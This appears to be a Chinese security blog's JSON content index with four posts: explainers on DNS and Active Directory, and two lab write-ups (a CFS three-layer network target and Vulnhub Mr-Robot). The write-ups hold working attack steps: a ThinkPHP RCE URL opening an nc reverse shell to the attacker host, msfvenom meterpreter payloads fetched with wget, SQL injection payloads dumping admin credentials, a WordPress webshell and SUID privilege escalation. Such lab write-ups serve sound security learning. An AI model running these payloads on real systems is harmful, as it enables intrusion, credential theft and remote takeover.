{"meta":{"title":"TryHard3r's Blog","subtitle":"生于忧患 死于安乐","description":"","author":"TryHard3r","url":"https://tryhard3r.github.io","root":"/"},"pages":[{"title":"404","date":"2019-12-31T16:00:00.000Z","updated":"2020-08-26T16:06:46.000Z","comments":true,"path":"404.html","permalink":"https://tryhard3r.github.io/404.html","excerpt":"","text":""},{"title":"categories","date":"2018-09-30T09:25:30.000Z","updated":"2020-08-26T15:43:02.000Z","comments":true,"path":"categories/index.html","permalink":"https://tryhard3r.github.io/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2018-09-30T09:25:30.000Z","updated":"2020-08-26T15:42:52.000Z","comments":true,"path":"about/index.html","permalink":"https://tryhard3r.github.io/about/index.html","excerpt":"","text":""},{"title":"friends","date":"2020-08-26T16:03:26.000Z","updated":"2020-08-26T16:03:50.000Z","comments":true,"path":"friends/index.html","permalink":"https://tryhard3r.github.io/friends/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2020-09-08T17:02:34.198Z","updated":"2020-01-05T15:09:56.000Z","comments":true,"path":"links/index.html","permalink":"https://tryhard3r.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2020-09-08T17:02:34.191Z","updated":"2020-01-05T15:09:56.000Z","comments":false,"path":"repository/index.html","permalink":"https://tryhard3r.github.io/repository/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-30T10:23:38.000Z","updated":"2020-08-26T15:42:42.000Z","comments":true,"path":"tags/index.html","permalink":"https://tryhard3r.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"深入理解DNS","slug":"深入理解DNS","date":"2020-03-31T03:20:53.000Z","updated":"2020-09-08T17:20:13.297Z","comments":true,"path":"p/4e79.html","link":"","permalink":"https://tryhard3r.github.io/p/4e79.html","excerpt":"","text":"什么是DNS DNS全称Domain Name System，即域名系统。在TCP/IP网络环境中，我们都是通过套接字（IP:Port）来实现端到端的通信，然而IP地址这么多，我们不可能同时记住这么多IP，于是域名应运而生，相比起来要好记忆很多。但是光有域名还不够，必须还要有一种对应关系，于是DNS服务器就派上用场了，它的功能就是提供域名和IP之间的相互转换，这个过程中负责查询的组件称之为DNS Resolver，它会查询本地DNS缓存和远程DNS Server。举个简单的例子：我们平时使用最多的百度，每次我们用到的时候都是直接在浏览器的地址栏输入百度的域名，就像这样： 除此之外，我们也可以使用IP的方式来访问，先使用nslookup解析得到百度的IP 然后在地址栏输入IP访问 DNS记录类型 A 记录：域名对应的IPv4地址。 AAAA 记录：域名对应的IPv6地址。 CNAME 记录：别名记录，即域名的别名解析。例如CDN通常都是配置为CNAME记录，将多个不同的域名解析到同一个主机。 NS 记录：域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。 MX 记录：邮件交换记录，是DNS中的一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器。MX记录允许设置一个优先级，当多个邮件服务器可用时，会根据该值决定投递邮件的服务器。简单邮件传输协议（SMTP）会根据MX记录的值来决定邮件的路由过程。 PTR 记录：根据IP反向查找域名。 SRV 记录：SRV记录是DNS服务器的数据库中支持的一种资源记录的类型，它记录了哪台计算机提供了哪个服务的信息。一般是为Microsoft的活动目录设置时的应用。DNS可以独立于活动目录，但是活动目录必须有DNS的帮助才能工作。为了活动目录能够正常的工作，DNS服务器必须支持服务定位（SRV）资源记录，资源记录把服务名字映射为提供服务的服务器名字。活动目录客户和域控制器使用SRV资源记录决定域控制器的IP地址。 TXT 记录：域名的文本记录。可以记录联系方式、服务版本信息、反垃圾邮件等。 SOA 记录：起始授权机构记录。记录NS中哪个是主服务器，一个解析库有且只有一条SOA记录且必须为解析库的第一条记录。 DNS的层级结构 根域（ROOT）：规定由尾部的‘.’来指定。 顶级域（TLD）：代表一种类型的组织机构或国家地区。如com代表商业公司，edu代表教育机构，cn代表中国等。 二级域（SLD）：标明顶级域内的一个特定组织。如baidu.com中的baidu，二级域名是用户可以注册的。 主机名（host）：位于域名空间最底层，是一台具体的计算机，例如www.baidu.com中的www。 FQDN：全称Fully Qualified Domain Name，即完全限定域名。由主机名和域名组成，从完全限定域名中包含的信息可以看出主机在域名树中的位置。 DNS服务器的层级结构 和域名系统类似，域名服务器也是层级式的架构，每一个域名服务器只负责管理域名系统中的一部分。 根域名服务器：最高层次也是最重要的域名服务器，所有的根域名服务器都知道所有的顶级域名服务器的域名和IP地址。任何一个本地域名服务器要对任何一个域名进行解析，只要自己无法解析就首先求助根域名服务器，因此根域名服务器是最重要的域名服务器。假定所有的根域名服务器都瘫痪了，那么整个DNS系统就无法工作。通常情况下，根域名服务器并不会直接把待查询的域名解析出IP地址，而是告诉本地域名服务器下一步应当找哪一个顶级域名服务器进行查询。 顶级域名服务器：负责管理在该顶级域名服务器注册的二级域名。例如com域名服务器、edu域名服务器等。 权限域名服务器：负责一个区的域名服务器。 本地域名服务器：本地域名服务器不属于域名服务器的层次结构，但是它对域名系统非常重要。当一个主机发出DNS查询请求时，这个查询请求报文就发送给本地域名服务器。 DNS服务器的分级查询DNS服务器根据域名的层级进行分级查询，大致过程如下： 从”根域名服务器”查到”顶级域名服务器”的NS记录和A记录（IP地址） 从”顶级域名服务器”查到”次级域名服务器”的NS记录和A记录（IP地址） 从”次级域名服务器”查出”主机名”的IP地址 这里有一个细节，没有提到本地DNS服务器是怎样知道根域名服务器的IP地址的。原因是根域名服务器的NS记录和IP地址一般是不会变化的，所以内置在DNS服务器里面。 DNS服务器类型 主域名服务器 负责维护一个区域的所有域名信息，是特定的所有信息的权威信息源，数据可以修改。 辅助域名服务器 当主域名服务器出现故障、关闭或负载过重时，辅助域名服务器作为主域名服务器的备份提供域名解析服务。辅助域名服务器中的区域文件中的数据是从另外的一台主域名服务器中复制过来的，是不可以修改的。 缓存域名服务器 从某个远程服务器取得每次域名服务器的查询回答，一旦取得一个答案就将它放在高速缓存中，以后查询相同的信息就用高速缓存中的数据回答，缓存域名服务器不是权威的域名服务器，因为它提供的信息都是间接信息。 转发域名服务器 负责所有非本地域名的本地查询。转发域名服务器接到查询请求后，在其缓存中查找，如找不到就将请求依次转发到指定的域名服务器，直到查找到结果为止，否则返回无法映射的结果。 DNS服务器区域解析流向 正向：FQDN -&gt; IP，即通过域名解析出IP。 反向：IP -&gt; FQDN，即通过IP解析出域名。 无论是正向区域还是反向区域都需要有一个单独的解析数据库去解析。 DNS解析流程 客户端浏览器访问www.baidu.com，首先检查当前浏览器缓存，如果有缓存就直接响应，如果没有就继续往下找。 系统检查hosts文件，如果有对应关系则直接响应，如果没有就继续往下找。 请求本地域名服务器，主机向本地域名服务器的查询一般都是采用递归查询。如果主机所询问的本地域名服务器不知道被查询的域名的IP地址，那么本地域名服务器就代替主机以DNS客户端的身份继续向其它根域名服务器发出查询请求报文，而不是让主机自己进行下一步查询。因此递归查询返回的查询结果要么是域名对应的IP地址，要么报错表示无法查询到所需的IP地址。本地域名服务器查找自身的DNS缓存和解析数据库，如果有则直接响应，如果没有就继续往下找。 本地域名服务器自动帮我们向根域名服务器发送查询请求，通常是采用迭代查询。当根域名服务器收到本地域名服务器发出的迭代查询请求报文时，要么给出所要查询的IP地址，要么告诉本地域名服务器下一步应当向哪一个域名服务器进行查询，然后让本地域名服务器自己进行后续的查询。根域名服务器通常是把自己知道的顶级域名服务器的IP地址告诉本地域名服务器，让本地域名服务器再向顶级域名服务器查询。顶级域名服务器收到本地域名服务器的查询请求后，要么给出所要查询的IP地址，要么告诉本地域名服务器下一步应当向哪一个权限域名服务器进行查询。最后将解析的IP地址或报错返回给发起查询的主机，同时也会将本次解析得到的结果保存到自身的缓存中。 关于递归查询和迭代查询，用形象一点的表达来描述就是：A有一道题不会做去问B，B看了之后发现自己也不会做，于是拿着题目去问C，C发现自己也不会做又拿着题目去问D，终于D做出了这道题，然后C去告诉B，B再去告诉A，这就是递归查询。而另一种情况是，B发现自己不会做就告诉A这道题C应该会，你自己去问C，于是A拿着题目去问C，C发现自己不会做就告诉A这道题D应该会，你自己去问D，最终D教A做出了这道题，这就是迭代查询。 DNS服务器在域中的作用 Windows 2000中最重要的新概念之一就是：计算机不再主要用NetBIOS（网络基本输入/输出系统）名称来标识，而是使用DNS完全限定域名（FQDN）来标识。AD DS要求DNS按名称查找计算机、域控制器、成员服务器和网络服务。 域的命名以DNS标准命名，可以让活动目录表现出层次结构化的树状结构。DNS服务器通过将名称映射到IP地址为基于TCP/IP的网络提供DNS名称解析服务，从而使计算机可以查找AD DS环境中的网络资源，域内计算机通过DNS服务器上的SRV记录定位目录服务。 DNS是活动目录所必需的，搭建域环境时会发现，安装Active Directory域服务会提示需要安装DNS服务器，通常我们都会选择让他自动安装DNS服务器，当然DNS服务器不一定要安装在域控上，也可以单独部署，但是不建议这样做。 DNS在域中最主要的作用就是定位域控制器，域控制器需要将自己登记到DNS服务器内，以便让其它计算机通过DNS服务器找到域控制器。然后域内的所有客户机包括域控的DNS都必须设置为DNS服务器的IP，以此来保证域内计算机之间的正常通信。 标识的地方表示域内包括域控在内共有3台计算机，同时在192.168.80.20这台计算机上还搭建了3个网站，域内所有计算机都可以通过这3个域名来访问192.168.80.20这台计算机上的Web服务。 DNS在域中的作用小结： 域的命名以DNS标准命名 活动目录需要相应的DNS支持 作为域控制器的定位器服务 参考资料DNS深度理解[一] DNS原理入门 DNS递归查询与迭代查询 DNS工作原理","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://tryhard3r.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"网络协议","slug":"网络协议","permalink":"https://tryhard3r.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"}]},{"title":"域渗透基础","slug":"域渗透基础","date":"2020-03-22T06:46:52.000Z","updated":"2020-03-31T15:27:32.000Z","comments":true,"path":"p/7394.html","link":"","permalink":"https://tryhard3r.github.io/p/7394.html","excerpt":"","text":"Active Directory的组织架构 Active Directory即活动目录，目录所提供的服务是要让使用者更快的找到所需要的数据。例如电话目录保存电话号码，可以让我们快速查找联系人；文件目录保存文件名、大小和日期等信息，可以让我们快速找到文件；而Windows的活动目录，则是用来管理Windows网络中的资源对象，便于我们对资源的管理。域是一种逻辑的组织形式，活动目录是实现域的方法。活动目录本身是一种层级式的树状架构，大致可以描述为：林——域树——域——组织单位——对象，即林包含域树，域树包含多个域，域包含多个组织单位，组织单位包含多个对象（也可以继续包含组织单位）。 相关概念AD DS 全称Active Directory Domain Services，即活动目录域服务。Active Directory域内的Directory Database（目录数据库）用来存储用户帐户、计算机帐户、打印机与共享文件夹等对象，而提供目录服务的组件就是AD DS，它负责目录数据库的存储、新建、删除、修改与查询等工作。例如在AD DS上新建一个用户，使用这个用户的登录凭据即可登录到域内所有计算机，而不需要在每一台计算机上单独新建用户。 域 英文是DOMAIN，域是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系。域既是Windows网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在Windows网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其它的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其它域的安全信任关系。 域树 当企业规模较大时，单域环境无法满足管理需求，这时可以假设多个域的环境，以域树的形式存在。如图：最上层的域名为pentest.org，为此域树的根域，根域下有两个子域，子域下又分别有子域。域树的命名遵从DNS域名空间的命名规则且具有连续性，子域的域名包含其父域的域名。域树内的所有域共享一个AD DS，但数据分散存储在各个域中，每个域只存储隶属于该域的数据。 林 林由一个或多个域树组成，每一个域树都有自己唯一的名称空间，也就是说域林中多个域树之间的域名是不连续的。第一个域树的根域，就是整个林的根域，同时其域名也就是林的名称。在建立林时，每一个域树的根域与林根域之间的双向可传递的信任关系会自动建立起来，因此每一个域树中的每一个域内的用户，就可以访问其它域树中的资源，也就是整个林中的资源。 对象与属性 AD DS内的资源都以对象的形式存在，用户、计算机、打印机等都是对象，对象通过一些属性来描述其特征。如一个用户就是一个对象，而用户的姓、名、Email等就是这个对象的属性。 容器 与对象类似，容器有自己的名称，也包含一些属性，但是容器内可以包含其他对象，也可以包含其它容器。 OU OU全称为Organization Units，即组织单位，是一种特殊的容器，不仅可以包含其他对象和组织单位，还可以为组织单位添加组策略。例如：有一个安全部的组织单位，部门内部又分小组，每一个小组又是一个组织单位。AD DS以层级式架构将对象、容器与组织单位等组合在一起存储到AD DS数据库内。 信任关系 英文为Trust Relation，信任关系是连接域与域之间的桥梁，两个域之间必须拥有信任关系，才能相互访问对方域内的资源。一个新的AD DS域加入域树后，会自动信任其上一层的父域，同时父域也会自动信任这个子域，这些信任关系具有双向传递性。由于此信任工作是通过Kerberos Security Protocol来完成的，因此也成为Kerberos Trust。信任关系的双向传递性如图： 域A信任域B，域B又信任C域，则域A会自动信任域C；同时域C信任域B，域B又信任域A，则域C会自动信任域A，最终实现域A和域C自动建立双向的信任关系。因此当一个新域加入域树后，会自动双向信任这个域树内所有的域。这样新加入的域内用户就可以访问其它域内的资源，同时域树内的用户也可以直接访问新域中的资源。 DC 全称Domain Controller，即域控制器。AD DS的目录数据是存储在域控制器内的，一个域内可以有多台域控制器，且每一台域控制器的地位几乎是平等的，它们各自保存着一份相同的AD DS数据库，并且彼此之间的数据会自动同步。例如在某一台域控制器添加用户，此用户的数据会保存在此域控制器的AD DS数据库中，然后会自动复制到其它域控制器中进行同步。多台域控制器可以提供容错功能，即使有一台域控制器故障了，其它域控制器仍然可以继续提供服务。此外多台域控制器也可以分担验证用户登录的负担，进而改善用户验证效率。 RODC 全称Read-Only Domain Controller，即只读域控制器。RODC的AD DS数据库只能读取不能修改，AD DS数据库内容必须从其它可读写的域控制器复制过来。RODC主要是用于远程分公司网络，因为安全措施不如总公司完备，采用RODC可以防止AD DS数据库被修改进而影响到整个域环境。 LDAP 全称Lightweight Directory Access Protocol，即轻型目录访问协议，是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。目录服务是由目录服务数据库和一套访问协议组成，Active Directory则是目录服务数据库的一种实现方式，而Active Directory采用的访问协议就是LDAP。AD DS利用LDAP名称路径来描述对象在AD DS内的位置，LDAP名称路径大致有如下几种： Distinguished Name（DN）：DN是对象在AD DS内的完整路径。例如一个用户的DN为：CN=张三，OU=业务一组，OU=业务部，DC=pentest，DC=org。这里的DC不是代表域控制器，而是Domain Component，表示DNS域名中的组件，例如pentest.org这个域名就有pentest和org两个组件。CN为Common Name，用户和计算机对象都属于CN，因此此DN表示用户张三存储在pentest.org\\业务部\\业务一组路径内。 Relative Distinguished Name（RDN）：RDN是用来代表DN完整路径中的部分路径，例如CN=张三就是RDN。 Global Unique Identifier（GUID）：系统会自动为每一个对象指定一个唯一的、128位的GUID，对象名称可以改变，但该对象的GUID永远不会改变。 User Principal Name（UPN）：UPN可以理解为DN的一种别名，通常比DN更短也更容易记忆。例如张三隶属于域pentest.org，则UPN可为zs@pentest.org。用户登录时最好使用UPN，因为无论用户被移动到哪个域，其UPN都不会变，而DN是可能会变的，这样可以一直使用同一个名称来登录。 Service Principal Name（SPN）：根据DNS主机名来建立，用来代表某台计算机所支持的服务，让其它计算机可以通过SPN来与这台计算机的服务进行交互。 组策略 组策略功能让系统管理员可以充分管理与控制用户工作环境，减轻系统管理员的管理负担。组策略主要功能有： 账户策略的设置：如设置用户账户的密码长度、密码使用期限、账户锁定策略等。 本地策略的设置：例如设置审核策略、用户权限的分配、安全性的设置等。 脚本的设置：例如登录与注销、启动与关机脚本的设置。 用户工作环境的设置：例如隐藏用户桌面图标、强制通过指定的代理服务器上网等。 软件的安装与删除：用户登录或计算机启动时，自动为用户安装应用软件、自动修复应用软件或自动删除应用软件。 限制软件的执行：限制域用户只能运行指定的软件。 文件夹的重定向：改变文件夹的存储位置。 限制访问可移动存储设备：例如限制将文件写入U盘。 其它的系统设置：例如限制安装设备驱动程序等。 GPO GPO全称为Group Policy Object，即组策略对象。组策略通过组策略对象来设置，只要将GPO链接到指定的站点、域或组织单位，GPO内的设置就会影响到该站点、域或组织单位内的所有用户与计算机。 AD DS域的两个内置GPO： Default Domain Policy：此GPO默认已经被链接到域，因此设置值会应用到整个域内的所有用户和计算机。 Default Domain Controller Policy：此GPO默认已经被链接到组织单位Domain Controllers，因此设置值会应用到Domain Controllers内的所有用户和计算机（Domain Controllers内默认只有域控制器的计算机账户）。 域委派 域委派是指将域内用户的权限委派给服务账户，使得服务账户能以用户的权限在域内展开活动，接受委派的只能是服务账户或者计算机用户。例如有一个用户要访问域内计算机A上的HTTP服务，而HTTP服务需要请求计算机B上的数据库服务，但是计算机A不知道该用户是否有权限访问计算机B上的数据库服务，这时HTTP服务会用该用户的身份去访问数据库服务，若该用户有权限访问计算机B上的数据库则访问成功，否则访问失败。委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)，而约束委派又可以进一步分为传统约束委派和基于资源的约束委派。在理解约束委派和非约束委派前，先简单回忆一下Kerberos认证的大致流程： 非约束委派：服务账户可以使用域用户的TGT模拟用户请求任意服务。 约束委派：由于非约束委派的不安全性，微软在Windows 2003中发布了约束委派的功能，简单来说就是KDC不会再直接发送用户的TGT给服务账户，这样服务账户就不能使用域用户的TGT去访问任意服务。 参考资料《Windows Server 2012 R2 Active Directory 配置指南》 域渗透基础（一） Active Directory(活动目录) &amp; Domain（域） Kerberos Security","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://tryhard3r.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://tryhard3r.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"CFS三层靶机渗透","slug":"CFS三层靶机渗透","date":"2020-03-11T10:12:24.000Z","updated":"2020-03-31T07:03:22.000Z","comments":true,"path":"p/5005.html","link":"","permalink":"https://tryhard3r.github.io/p/5005.html","excerpt":"","text":"环境部署靶机IP配置如下 KALI Linux ​ NAT：192.168.1.12Target1_CentOS 7 ​ NAT：192.168.1.11 ​ VMnet1：192.168.22.11 Target2_Ubuntu ​ VMnet1：192.168.22.22 ​ VMnet2：192.168.33.22 Target3_Windows 7 ​ VMnet2：192.168.33.33 网络拓扑图 外部打点对Target1_CentOS 7进行端口扫描 nmap -T4 -A 192.168.1.11 --script=vuln返回结果如下 Nmap scan report for 192.168.1.11 Host is up (0.0024s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Pure-FTPd |_clamav-exec: ERROR: Script execution failed (use -d to debug) |_sslv2-drown: 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) |_clamav-exec: ERROR: Script execution failed (use -d to debug) | vulners: | cpe:/a:openbsd:openssh:7.4: | CVE-2018-15919 5.0 https://vulners.com/cve/CVE-2018-15919 |_ CVE-2017-15906 5.0 https://vulners.com/cve/CVE-2017-15906 80/tcp open http nginx |_clamav-exec: ERROR: Script execution failed (use -d to debug) |_http-csrf: Couldn&#39;t find any CSRF vulnerabilities. |_http-dombased-xss: Couldn&#39;t find any DOM based XSS. | http-enum: |_ /robots.txt: Robots file |_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities. 111/tcp open rpcbind 2-4 (RPC #100000) |_clamav-exec: ERROR: Script execution failed (use -d to debug) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind |_ 100000 3,4 111/udp6 rpcbind 888/tcp open http nginx |_clamav-exec: ERROR: Script execution failed (use -d to debug) |_http-csrf: Couldn&#39;t find any CSRF vulnerabilities. |_http-dombased-xss: Couldn&#39;t find any DOM based XSS. |_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities. 3306/tcp open mysql MySQL (unauthorized) |_clamav-exec: ERROR: Script execution failed (use -d to debug) |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug) 8888/tcp open http Ajenti http control panel |_clamav-exec: ERROR: Script execution failed (use -d to debug) |_http-csrf: Couldn&#39;t find any CSRF vulnerabilities. |_http-dombased-xss: Couldn&#39;t find any DOM based XSS. | http-enum: |_ /robots.txt: Robots file |_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities. Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 564.95 seconds先看看80端口 ThinkPHP V5.0 RCEhttp://192.168.1.11/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami 漏洞存在，KALI开启nc监听，然后直接反弹shell http://192.168.1.11/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=nc 192.168.1.12 8888 -e /bin/bash 升级为交互式shell python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;杀入第一层内网查看一下目录文件 flag-1：flag{e2D3aFdasde} 查看robot.txt flag-2：flag{QeaRqaw12fs} 查看根目录 flag-3：flag{qEa12Nasd1a} 使用msf生成elf木马 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=7777 -f elf &gt;shell.elf python开启web服务 python -m SimpleHTTPServer 8080 使用wget下载elf木马 wget http://192.168.1.12:8080/shell.elf 下载成功，KALI开启msf监听（root用户运行msf，否则后面添加路由会失败） 运行elf木马后成功返回meterpreter 查看一下网卡信息发现有用的网卡只有两个 Interface 2 ============ Name : ens33 Hardware MAC : 00:0c:29:ab:16:23 MTU : 1500 Flags : UP,BROADCAST,MULTICAST IPv4 Address : 192.168.1.11 IPv4 Netmask : 255.255.255.0 IPv6 Address : fe80::a9bb:418e:ae4c:169e IPv6 Netmask : ffff:ffff:ffff:ffff:: Interface 3 ============ Name : ens37 Hardware MAC : 00:0c:29:ab:16:2d MTU : 1500 Flags : UP,BROADCAST,MULTICAST IPv4 Address : 192.168.22.11 IPv4 Netmask : 255.255.255.0 IPv6 Address : fe80::8790:648d:2d12:1a74 IPv6 Netmask : ffff:ffff:ffff:ffff::获取当前网段 run get_local_subnets 添加路由 run autoroute -s 192.168.22.0/24 查看路由信息 run autoroute -p 先使用background让会话在后台运行，然后对192.168.22.0/24网段进行扫描 发现192.168.22.22存活 构建隧道杀入第二层内网msf建立socks隧道 编辑proxychains配置文件 sudo vim /etc/proxychains.conf 对192.168.22.22进行端口扫描，因为socks代理不支持arp和icmp协议，所以用tcp扫描 sudo proxychains nmap -p 1-10000 -Pn -sT 192.168.22.22 发现开放了80端口 浏览器设置好代理，我们msf用的socks4，因此这里也选择socks4 BageCMS SQL注入访问：http://192.168.22.22/ 查看一下源码 发现注入点 使用sqlmap进行注入 proxychains sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword 查看数据库 proxychains sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword --dbs 查看数据表 proxychains sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms --tables 查看列数据 proxychains sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin --columns 读取数据 proxychains sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin -C username,password --dump连接不稳定导致读取数据出错，改用手工注入 判断列数 http://192.168.22.22/index.php?r=vul&amp;keyword=1&#39; order by 39 --+查看数据库 http://192.168.22.22/index.php?r=vul&amp;keyword=1&#39; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,group_concat(schema_name) from information_schema.schemata --+ 查看数据表 http://192.168.22.22/index.php?r=vul&amp;keyword=1&#39; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,group_concat(table_name) from information_schema.tables where table_schema=0x62616765636d73 --+ 查看数据字段 http://192.168.22.22/index.php?r=vul&amp;keyword=1&#39; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,group_concat(column_name) from information_schema.columns where table_name=0x626167655f61646d696e --+ 查看用户名 http://192.168.22.22/index.php?r=vul&amp;keyword=1&#39; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,username from bage_admin --+ 查看密码 http://192.168.22.22/index.php?r=vul&amp;keyword=1&#39; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,password from bage_admin --+ 解密得到账号密码：admin:123qwe 接下来就是找后台，用Nikto扫描一下 sudo proxychains nikto -h 192.168.22.22 查看robots.txt 访问http://192.168.22.22/index.php?r=admini发现后台，使用账号密码登录 登录成功并得到第四个flag flag-4：flag{eS3sd1IKarw} BageCMS 后台GetShell编辑模板文件写入webshell 使用proxychains运行蚁剑连接webshell proxychains ./AntSword 发现第五个flag flag-5：flag{23ASfqwr4t2e} 继续反弹到msf，因为在第二层内网无法访问外网，因此使用正向连接的payload msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=6666 -f elf &gt; msf.elf 使用蚁剑上传elf木马 KALI用proxychains代理msf开启监听 sudo proxychains msfconsole webshell上运行elf文件 杀入第三层内网查看网卡发现有用的网卡只有两个 Interface 2 ============ Name : ens33 Hardware MAC : 00:0c:29:2a:2b:0d MTU : 1500 Flags : UP,BROADCAST,MULTICAST IPv4 Address : 192.168.22.22 IPv4 Netmask : 255.255.255.0 IPv6 Address : fe80::d03f:6e7a:5bf2:7e55 IPv6 Netmask : ffff:ffff:ffff:ffff:: Interface 3 ============ Name : ens38 Hardware MAC : 00:0c:29:2a:2b:17 MTU : 1500 Flags : UP,BROADCAST,MULTICAST IPv4 Address : 192.168.33.22 IPv4 Netmask : 255.255.255.0 IPv6 Address : fe80::b960:1d19:17e0:d5dd IPv6 Netmask : ffff:ffff:ffff:ffff::获取当前网段 run get_local_subnets 添加路由 run autoroute -s 192.168.33.0/24 查看路由信息 run autoroute -p 扫描内网 发现存在192.168.33.33且开放了445，猜测是Windows，进一步验证 开放了445的Windows 7，永恒之蓝打一波试试 永恒之蓝利用 拿到第六个flag flag-6：flag{2wAdK32Lsd} 参考资料https://mp.weixin.qq.com/s/MJjDM1hgHLT6TWylW6IKqw https://mp.weixin.qq.com/s/5_OWux0dpTnSTCrbkXLPmg http://liuwx.cn/Red-Teaming-CFS.html#%E6%9D%80%E5%85%A5%E7%AC%AC%E4%B8%80%E5%B1%82%E5%86%85%E7%BD%91Target1","categories":[{"name":"靶机","slug":"靶机","permalink":"https://tryhard3r.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://tryhard3r.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"[Vulnhub]-Mr-Robot: 1","slug":"Vulnhub-Mr-Robot-1","date":"2020-03-06T03:17:28.000Z","updated":"2020-03-06T10:10:34.000Z","comments":true,"path":"p/a5cb.html","link":"","permalink":"https://tryhard3r.github.io/p/a5cb.html","excerpt":"","text":"靶机地址：https://www.vulnhub.com/entry/mr-robot-1,151/ 先探测一下靶机的IP和端口信息 nmap -A -T4 192.168.80.0/24 得到靶机IP为192.168.80.17，开放了80和443端口，22端口关闭，访问一下80端口 页面特性还挺有特点，之前在0ops战队官网见过类似的交互式页面，输入对应的命令返回对应的信息，所以知道肯定是不能直接执行系统命令的，用gobuster扫描一下目录 gobuster dir -u http://192.168.80.17 -w /home/tryhard3r/tools/Dic/dir.txt -s 200 存在admin目录，很可能是后台地址，还有robots.txt，先看下robots.txt有什么信息 fsocity.dic是一个字典文件，说明后续可能有暴力破解的步骤要用到，先下载保存。还有一个应该是第一个flag flag-1：073403c8a58a1f80d943455fb30724b9 继续访问admin目录发现一直在加载，这里应该不是真正的后台，而是作者故意留的一个坑，我们使用Nikto再次扫描 发现存在WordPress后台地址，这次应该没错，访问：http://192.168.80.17/wp-login.php 看来这里就是入口了，我们需要先登录到后台再进行后续操作，别忘了之前我们下载的字典，现在可以派上用场了 BurpSuite抓包暴破用户名 设置暴破参数 加载我们的字典 得到两个用户：Elliot、elliot 继续暴破elliot用户密码 elliot用户密码：ER28-0652 登录后台成功，准备getshell 用MSF生成一个PHP的payload msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.80.4 LPORT=12345 -f raw &gt; /home/tryhard3r/tools/shell.php 复制shell.php里面的内容 后台编辑404.php页面，清空里面的内容替换为我们的payload，替换完保存 MSF开启监听然后访问404.phpmsf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set LHOST 192.168.80.4msf5 exploit(multi/handler) &gt; set LPORT 12345msf5 exploit(multi/handler) &gt; exploit 成功拿到会话，查看当前用户 进入shell 升级为交互式shell python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; 查看home目录 发现robot用户，进去看看 发现第二个flag，还有一个文件应该是MD5加密的密码 直接读取flag文件失败，看来我们需要切换到robot用户，先查看密码文件 对密码进行MD5解密得到密码：abcdefghijklmnopqrstuvwxyz 再尝试切换到robot用户 切换成功，查看之前的第2个flag文件 flag-2：822c73956184f694993bede3eb39f959 第三个flag应该需要获得root权限，尝试SUID提权 列出正在系统上运行的所有SUID可执行文件 find / -perm -u=s -type f 2&gt;/dev/null 查看nmap权限 进入nmap交互模式 提权成功，切换到root目录看看有没有flag 